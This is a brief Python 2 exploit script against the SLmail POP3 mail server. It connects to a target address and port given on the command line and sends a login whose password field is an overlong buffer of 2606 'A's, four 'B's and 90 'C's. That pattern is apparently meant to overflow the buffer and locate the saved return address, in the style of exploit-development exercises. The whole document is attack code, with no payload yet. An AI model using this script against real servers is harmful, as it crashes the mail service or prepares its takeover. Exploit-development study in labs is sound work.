#!/usr/bin/python

import time, struct, sys
import socket as so

bufferz = "A" * 2606 + "B" * 4 + "C" * 90

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 192.168.132.5 110" % sys.argv[0]
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)
print "\n[+] Attempting to send buffer overflow to SLmail...."
try:
   s.connect((server,port))
   s.recv(1024)
   s.send('USER jesse' +'\r\n')
   s.recv(1024)
   s.send('PASS ' + bufferz + '\r\n')
   print "\n[+] Completed."
except:
   print "[+] Unable to connect to SLmail. Check your IP address and port"
   sys.exit()
